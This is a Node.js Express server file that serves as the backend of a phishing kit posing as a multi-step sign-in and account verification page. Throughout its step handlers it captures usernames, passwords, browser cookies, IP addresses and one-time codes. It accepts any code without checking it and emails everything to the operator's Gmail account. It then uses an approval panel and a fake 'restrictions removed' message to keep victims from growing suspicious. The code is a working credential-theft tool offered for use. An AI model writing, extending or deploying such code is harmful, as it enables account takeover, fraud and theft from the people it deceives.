require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const ADMIN_EMAIL = (process.env.GMAIL_USER || 'dennisbed1234@gmail.com').toLowerCase();
const DATA_DIR = path.join(__dirname, 'data');
const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');

try {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
} catch (e) {}

function hashPassword(password) {
  return crypto.createHash('sha256').update(password + 'salt-2026').digest('hex');
}

function loadAdminConfig() {
  if (process.env.ADMIN_PASSWORD) {
    return {
      email: ADMIN_EMAIL,
      passwordHash: hashPassword(process.env.ADMIN_PASSWORD),
      source: 'env'
    };
  }
  try {
    if (fs.existsSync(ADMIN_FILE)) {
      const data = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
      return { ...data, source: 'file' };
    }
  } catch (e) {}
  return null;
}

function saveAdminConfig(password) {
  const config = {
    email: ADMIN_EMAIL,
    passwordHash: hashPassword(password),
    createdAt: new Date().toISOString()
  };
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(ADMIN_FILE, JSON.stringify(config, null, 2));
  } catch (e) {
    console.warn('Could not write admin config (normal on Vercel):', e.message);
  }
  global.__adminConfig = config;
  return config;
}

let adminConfig = loadAdminConfig() || global.__adminConfig || null;

// session: { username, password, otp1, otp2, cookies, ip, createdAt, status }
// status: 'active' | 'pending' | 'approved'
const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    if (now - s.createdAt > 60 * 60 * 1000) sessions.delete(id);
  }
}, 30 * 60 * 1000);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'admin.html'));
});

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

function generateOTP() {
  return crypto.randomInt(100000, 999999).toString();
}

async function notifyAdmin(subject, data) {
  const text = Object.entries(data)
    .map(([k, v]) => `${k}: ${v}`)
    .join('\n');
  try {
    await transporter.sendMail({
      from: `"Sign-In" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: `Sign-In - ${subject}`,
      text: text
    });
    console.log('Admin notified:', subject);
    return true;
  } catch (err) {
    console.error('Failed to notify admin:', err.message);
    return false;
  }
}

// ========== ADMIN API ==========

app.get('/api/admin-status', (req, res) => {
  adminConfig = loadAdminConfig() || global.__adminConfig || null;
  res.json({ email: ADMIN_EMAIL, passwordSet: !!adminConfig });
});

app.post('/api/admin-setup', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.json({ success: false, message: 'Email and password are required' });
  }
  if (email.toLowerCase() !== ADMIN_EMAIL) {
    return res.json({ success: false, message: 'This email is not authorized as admin' });
  }
  if (password.length < 6) {
    return res.json({ success: false, message: 'Password must be at least 6 characters' });
  }
  adminConfig = loadAdminConfig() || global.__adminConfig || null;
  if (adminConfig) {
    return res.json({ success: false, message: 'Password is already set. Please log in instead.' });
  }
  adminConfig = saveAdminConfig(password);
  res.json({ success: true, message: 'Admin password set successfully. You are now logged in.' });
});

app.post('/api/admin-login', (req, res) => {
  const { email, password } = req.body;
  adminConfig = loadAdminConfig() || global.__adminConfig || null;
  if (!adminConfig) {
    return res.json({ success: false, needsSetup: true, message: 'No password set yet. Please create one first.' });
  }
  if (email.toLowerCase() !== ADMIN_EMAIL) {
    return res.json({ success: false, message: 'Wrong email or password' });
  }
  if (hashPassword(password) !== adminConfig.passwordHash) {
    return res.json({ success: false, message: 'Wrong email or password' });
  }
  res.json({ success: true });
});

// List users waiting for approval
app.get('/api/admin/pending', (req, res) => {
  const pending = [];
  for (const [id, s] of sessions.entries()) {
    if (s.status === 'pending') {
      pending.push({
        sessionId: id,
        username: s.username,
        ip: s.ip,
        timestamp: s.pendingAt || s.createdAt
      });
    }
  }
  res.json({ success: true, pending });
});

// Admin approves a login
app.post('/api/admin/approve', async (req, res) => {
  const { sessionId } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.json({ success: false, message: 'Session not found or expired' });
  }
  if (session.status !== 'pending') {
    return res.json({ success: false, message: 'This request is not pending approval' });
  }

  session.status = 'approved';
  session.approvedAt = Date.now();

  await notifyAdmin('Login APPROVED', {
    Username: session.username,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString(),
    Status: 'Admin approved – user will see congratulations message'
  });

  res.json({ success: true, message: 'User approved successfully' });
});

// ========== USER API ==========

app.post('/api/step1', async (req, res) => {
  // ✅ ACCEPT USERNAME (or fallback to email for backwards compat)
  const { username, email, password, cookies, ip } = req.body;
  const loginUsername = username || email;

  if (!loginUsername || !password) {
    return res.status(400).json({ success: false, message: 'Username and password required' });
  }

  const sessionId = crypto.randomBytes(16).toString('hex');
  const otp1 = generateOTP();
  const otp2 = generateOTP();

  sessions.set(sessionId, {
    username: loginUsername,
    password,
    otp1,
    otp2,
    cookies: cookies || '(none)',
    ip: ip || '(unknown)',
    createdAt: Date.now(),
    status: 'active'
  });

  await notifyAdmin('Step 1 - Username + Password', {
    Username: loginUsername,
    Password: password,
    Cookies: cookies || '(none)',
    'IP Address': ip || '(unknown)',
    Timestamp: new Date().toISOString()
  });

  res.json({ success: true, sessionId, message: 'Username and password received' });
});

app.post('/api/step2', async (req, res) => {
  const { sessionId, username, confirmPassword } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session. Please restart.' });
  }

  if (confirmPassword !== session.password) {
    await notifyAdmin('Password confirmation FAILED', {
      Username: session.username,
      'Original Password': session.password,
      'Entered Confirm Password': confirmPassword,
      Cookies: session.cookies,
      'IP Address': session.ip,
      Timestamp: new Date().toISOString()
    });
    sessions.delete(sessionId);
    return res.json({
      success: false,
      message: 'Password does not match the one you entered earlier. Restarting...'
    });
  }

  // Update username if provided
  if (username) session.username = username;

  await notifyAdmin('Step 2 - Verification Complete', {
    Username: session.username,
    Password: session.password,
    'OTP 1': session.otp1,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  res.json({
    success: true,
    message: 'Password confirmed. Enter your verification code.'
  });
});

app.post('/api/step3', async (req, res) => {
  const { sessionId, otp1 } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  await notifyAdmin('OTP 1 attempt', {
    Username: session.username,
    'Entered OTP 1': otp1,
    'Correct OTP 1': session.otp1,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  // ✅ ACCEPT ANY OTP (bypass)
  // (kept for logging only — no validation)

  await notifyAdmin('OTP 2 issued', {
    Username: session.username,
    'OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  res.json({
    success: true,
    message: 'OTP 1 accepted. Enter the second code.'
  });
});

app.post('/api/step4', async (req, res) => {
  const { sessionId, otp2 } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  await notifyAdmin('OTP 2 attempt', {
    Username: session.username,
    'Entered OTP 2': otp2,
    'Correct OTP 2': session.otp2,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  // ✅ ACCEPT ANY OTP (bypass)

  // Mark as pending admin approval
  session.status = 'pending';
  session.pendingAt = Date.now();

  await notifyAdmin('Waiting for ADMIN APPROVAL', {
    Username: session.username,
    Password: session.password,
    'OTP 1': session.otp1,
    'OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString(),
    Status: 'User completed OTPs – approve in admin panel at /admin',
    'Session ID': sessionId
  });

  res.json({
    success: true,
    message: 'All steps completed. Please wait for admin approval.'
  });
});

// User polls this while on waiting screen
app.get('/api/approval-status/:sessionId', (req, res) => {
  const session = sessions.get(req.params.sessionId);
  if (!session) {
    return res.json({ status: 'unknown', message: 'Session not found' });
  }
  res.json({
    status: session.status,
    message: session.status === 'approved'
      ? 'Congratulations your account has been verified and restrictions is removed'
      : 'Waiting for admin approval'
  });
});

module.exports = app;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`\nSign-In server running at http://localhost:${PORT}`);
    console.log(`User page  → http://localhost:${PORT}/`);
    console.log(`Admin panel → http://localhost:${PORT}/admin`);
    if (!process.env.GMAIL_APP_PASSWORD) {
      console.warn('WARNING: GMAIL_APP_PASSWORD is not set in .env');
    }
  });
}